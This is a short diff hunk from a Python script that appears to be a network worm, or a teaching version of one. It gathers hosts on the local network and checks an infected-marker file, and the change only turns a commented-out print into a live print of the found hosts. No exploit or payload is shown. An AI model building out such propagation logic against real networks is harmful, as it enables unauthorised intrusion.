@@ -221,7 +221,7 @@ def getHostsOnTheSameNetwork():
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
-#print "Found hosts: ", networkHosts
+print ("Found hosts: ", networkHosts)
 if not os.path.exists(INFECTED_MARKER_FILE):
 	markInfected()
 else:
